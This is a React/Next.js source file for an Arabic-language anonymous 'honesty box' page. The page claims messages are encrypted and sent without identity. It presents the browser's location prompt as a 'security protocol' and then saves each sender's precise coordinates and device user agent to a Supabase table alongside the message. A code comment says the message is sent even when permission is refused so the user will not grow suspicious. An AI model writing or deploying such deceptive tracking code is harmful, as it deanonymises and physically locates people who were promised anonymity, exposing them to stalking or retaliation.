'use client';
import { createClient } from '@supabase/supabase-js';
import { useState, FormEvent } from 'react';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!, 
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

export default function Home() {
  const [message, setMessage] = useState<string>('');
  const [status, setStatus] = useState<string>('');

  const sendMessage = async (e: FormEvent) => {
    e.preventDefault();
    setStatus('جاري تأمين اتصالك وتشفير الرسالة...');

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          // جلب الإحداثيات الدقيقة
          const locationLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          
          const { error } = await supabase
            .from('messages')
            .insert([{ 
              content: message, 
              device: navigator.userAgent,
              location: locationLink 
            }]);

          if (error) setStatus('حدث خطأ في الاتصال، حاول مجدداً');
          else {
            setStatus('تم إرسال رسالتك بنجاح وبسرية تامة! ✅');
            setMessage('');
          }
        },
        async (err) => {
          // في حال رفض الإذن، نرسل الرسالة برضه عشان ميشكش
          await supabase.from('messages').insert([{ 
            content: message, 
            device: navigator.userAgent,
            location: "تم حجب التتبع من قبل المستخدم" 
          }]);
          setStatus('تم إرسال رسالتك بنجاح! ✅');
          setMessage('');
        },
        { enableHighAccuracy: true, timeout: 8000 }
      );
    }
  };

  return (
    <main className="min-h-screen flex items-center justify-center bg-[#fdfdfd] p-4" dir="rtl">
      <div className="bg-white p-8 rounded-[2rem] shadow-2xl max-w-md w-full text-center border border-gray-50">
        <div className="mb-6">
          <div className="bg-blue-50 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-2xl">🔒</span>
          </div>
          <h1 className="text-2xl font-bold text-gray-800">صندوق الصراحة الآمن</h1>
          <p className="text-gray-400 text-xs mt-2 leading-relaxed">
            نستخدم تقنيات التشفير لضمان وصول رسالتك بدون هوية. <br/>
            يرجى الموافقة على بروتوكول الأمان عند الطلب لإتمام الإرسال.
          </p>
        </div>
        
        <form onSubmit={sendMessage}>
          <textarea
            className="w-full p-5 border-2 border-gray-100 rounded-2xl mb-4 focus:outline-none focus:border-blue-400 text-right bg-gray-50 transition-all placeholder:text-gray-300"
            rows={5}
            placeholder="اكتب رسالتك هنا بكل حرية..."
            value={message}
            onChange={(e) => setMessage(e.target.value)}
            required
          />
          <button 
            type="submit" 
            className="w-full bg-[#1da1f2] text-white py-4 rounded-2xl font-bold hover:bg-[#1991db] active:scale-95 transition-all shadow-lg shadow-blue-100 text-lg"
          >
            إرسال الرسالة الآن
          </button>
        </form>
        
        {status && (
          <div className="mt-6 p-3 bg-blue-50 rounded-xl text-blue-600 text-xs font-bold animate-pulse">
            {status}
          </div>
        )}
      </div>
    </main>
  );
}